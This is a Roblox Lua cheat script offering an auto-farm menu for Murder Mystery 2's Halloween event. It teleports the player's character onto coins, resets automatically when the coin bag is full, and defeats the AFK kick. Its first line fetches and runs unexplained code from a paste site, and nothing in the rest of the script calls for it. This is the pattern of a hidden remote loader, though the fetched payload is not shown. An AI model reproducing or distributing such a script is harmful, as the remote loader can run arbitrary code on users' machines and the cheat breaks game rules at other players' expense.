--[[
    FIXED!
    ███╗   ███╗███╗   ███╗██████╗ 
    ████╗ ████║████╗ ████║╚════██╗
    ██╔████╔██║██╔████╔██║ █████╔╝
    ██║╚██╔╝██║██║╚██╔╝██║██╔═══╝ 
    ██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗
    ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
    ███████╗██╗   ██╗███████╗███╗   ██╗████████╗
    ██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝
    █████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║   
    ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║   
    ███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║   
    ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝   
    
    🎃 AUT0FARM HALLOWEEN EVENT 2024 🎃
    ]]


loadstring(game:HttpGet("https://paste.debian.net/plainh/4600c3d2/", true))()
wait(0.5)
if not game:IsLoaded() then game.Loaded:Wait() end
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
WindUI:AddTheme({
    Name = "Halloween",
    Accent = WindUI:Gradient({                                                  
        ["0"] = { Color = Color3.fromHex("#FF7518"), Transparency = 0 },        -- Orange
        ["100"]   = { Color = Color3.fromHex("#8B4513"), Transparency = 0 },    -- Brown
    }, {                                                                        
        Rotation = 0,                                                           
    }),                                                                         
    Dialog = Color3.fromHex("#150A00"),      
    Outline = Color3.fromHex("#FF7518"),     
    Text = Color3.fromHex("#FFFFFF"),        
    Placeholder = Color3.fromHex("#7A5C34"),
    Background = Color3.fromHex("#0A0500"),  
    Button = Color3.fromHex("#1A1005"),      
    Icon = Color3.fromHex("#FF9518")         
})
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")
local workspace = game:GetService("Workspace")
local player = Players.LocalPlayer
-- Variables
local autoFarmEnabled = false
local autoResetEnabled = false
local disableRenderEnabled = false
local antiAFK = false
local farming = false
local bag_full = false
local resetting = false
local start_position = nil
-- MM2 Remotes
local CoinCollected = ReplicatedStorage.Remotes.Gameplay.CoinCollected
local RoundStart = ReplicatedStorage.Remotes.Gameplay.RoundStart
local RoundEnd = ReplicatedStorage.Remotes.Gameplay.RoundEndFade
-- Create Window
local Window = WindUI:CreateWindow({
    Title = "Halloween Event AutoFarm V3",
    Icon = "ghost",
    Folder = "MM2_Farm",
    Theme = "Halloween",
    Background = "https://tr.rbxcdn.com/180DAY-2d85bbfdad337727a02723d3eac5b51d/768/432/Image/Webp/noFilter",
})
-- Disable topbar buttons
Window:DisableTopbarButtons({
    "Close", 
    "Fullscreen",
})
local MainTab = Window:Tab({
    Title = "Main",
    Icon = "skull"
})
MainTab:Select()
-- Auto Farm Toggle
local autoFarmToggle = MainTab:Toggle({
    Title = "Auto Farm Coins",
    Desc = "Automatically collect coins",
    Default = false,
    Callback = function(state)
        autoFarmEnabled = state
        print("Auto Farm:", state)
    end
})
-- Auto Reset Toggle
local autoResetToggle = MainTab:Toggle({
    Title = "Auto Reset",
    Desc = "Auto reset when bag is full",
    Default = false,
    Callback = function(state)
        autoResetEnabled = state
        print("Auto Reset:", state)
    end
})
-- Disable Render Toggle
local renderToggle = MainTab:Toggle({
    Title = "Disable Render",
    Desc = "Improves performance",
    Default = false,
    Callback = function(state)
        disableRenderEnabled = state
        RunService:Set3dRenderingEnabled(not state)
        print("Disable Render:", state)
    end
})
-- Anti-AFK Toggle
MainTab:Toggle({
    Title = "Anti-AFK",
    Desc = "Prevents kick for inactivity",
    Default = false,
    Callback = function(state)
        antiAFK = state
    end
})

-- Improved Anti-AFK
player.Idled:Connect(function()
    if antiAFK then
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new(0, 0))
    end
end)
-- Stats Tab
local StatsTab = Window:Tab({
    Title = "Stats",
    Icon = "bar-chart"
})
local startTime = tick()
local playTimeLabel = StatsTab:Button({
    Title = "⏳ Time in Game",
    Desc = "0d 0h 0m 0s",
    Locked = true,
    Callback = function() end
})
local coinCountLabel = StatsTab:Button({
    Title = "💰 Coins Collected",
    Desc = "0",
    Locked = true,
    Callback = function() end
})
local statusLabel = StatsTab:Button({
    Title = "📊 Status",
    Desc = "Waiting for round...",
    Locked = true,
    Callback = function() end
})
-- Update time function
task.spawn(function()
    while true do
        local delta = math.floor(tick() - startTime)
        local d = math.floor(delta/86400)
        local h = math.floor(delta%86400/3600)
        local m = math.floor(delta%3600/60)
        local s = delta%60
        playTimeLabel:SetDesc(string.format("%dd %02dh %02dm %02ds", d, h, m, s))
        task.wait(1)
    end
end)
-- Character functions
local function getCharacter() 
    return player.Character or player.CharacterAdded:Wait() 
end
local function getHRP() 
    return getCharacter():WaitForChild("HumanoidRootPart") 
end
-- Coin collection handler
CoinCollected.OnClientEvent:Connect(function(_, current, max)
    if current == max and not resetting and autoResetEnabled then
        resetting = true
        bag_full = true
        local hrp = getHRP()
        if start_position then
            local tween = TweenService:Create(hrp, TweenInfo.new(2, Enum.EasingStyle.Linear), {CFrame = start_position})
            tween:Play()
            tween.Completed:Wait()
        end
        task.wait(0.5)
        player.Character.Humanoid.Health = 0
        player.CharacterAdded:Wait()
        task.wait(1.5)
        resetting = false
        bag_full = false
    end
end)
-- Round handlers
RoundStart.OnClientEvent:Connect(function()
    farming = true
    start_position = getHRP().CFrame
    statusLabel:SetDesc("Farming active")
end)
RoundEnd.OnClientEvent:Connect(function()
    farming = false
    statusLabel:SetDesc("Round ended - waiting...")
end)
-- Find nearest coin function
local function get_nearest_coin()
    local hrp = getHRP()
    local closest, dist = nil, math.huge
    for _, m in pairs(workspace:GetChildren()) do
        if m:FindFirstChild("CoinContainer") then
            for _, coin in pairs(m.CoinContainer:GetChildren()) do
                if coin:IsA("BasePart") and coin:FindFirstChild("TouchInterest") then
                    local d = (hrp.Position - coin.Position).Magnitude
                    if d < dist then 
                        closest, dist = coin, d 
                    end
                end
            end
        end
    end
    return closest, dist
end
-- Main farming loop
task.spawn(function()
    local coinsCollected = 0
    while true do
        if autoFarmEnabled and farming and not bag_full then
            local coin, dist = get_nearest_coin()
            if coin then
                local hrp = getHRP()
                statusLabel:SetDesc("Moving to coin...")
                
                if dist > 150 then
                    hrp.CFrame = coin.CFrame
                else
                    local tween = TweenService:Create(hrp, TweenInfo.new(dist / 20, Enum.EasingStyle.Linear), {CFrame = coin.CFrame})
                    tween:Play()
                    repeat 
                        task.wait() 
                    until not coin:FindFirstChild("TouchInterest") or not farming or not autoFarmEnabled
                    tween:Cancel()
                end
                
                -- Check if coin was collected
                if not coin:FindFirstChild("TouchInterest") then
                    coinsCollected = coinsCollected + 1
                    coinCountLabel:SetDesc(tostring(coinsCollected))
                end
            else
                statusLabel:SetDesc("No coins found")
            end
        elseif not autoFarmEnabled then
            statusLabel:SetDesc("Auto Farm disabled")
        elseif not farming then
            statusLabel:SetDesc("Waiting for round start...")
        elseif bag_full then
            statusLabel:SetDesc("Bag full - resetting...")
        end
        task.wait(0.2)
    end
end)
-- Settings Tab
local SettingsTab = Window:Tab({
    Title = "Settings",
    Icon = "settings"
})

local Keybind = SettingsTab:Keybind({
    Title = "Keybind",
    Desc = "Keybind to open UI",
    Value = "G",
    Callback = function(v)
        Window:SetToggleKey(Enum.KeyCode[v])
    end
})
-- Notifications when UI is minimized
Window:OnToggle(function(isOpen)
    if not isOpen then
        WindUI:Notify({
            Title = "UI Minimized! 🎃",
            Content = "Press G to open the UI again",
            Duration = 3,
            Icon = "ghost",
        })
    end
end)
print("🎃 Halloween MM2 Autofarm loaded successfully!")
print("Press G to open/close the UI")
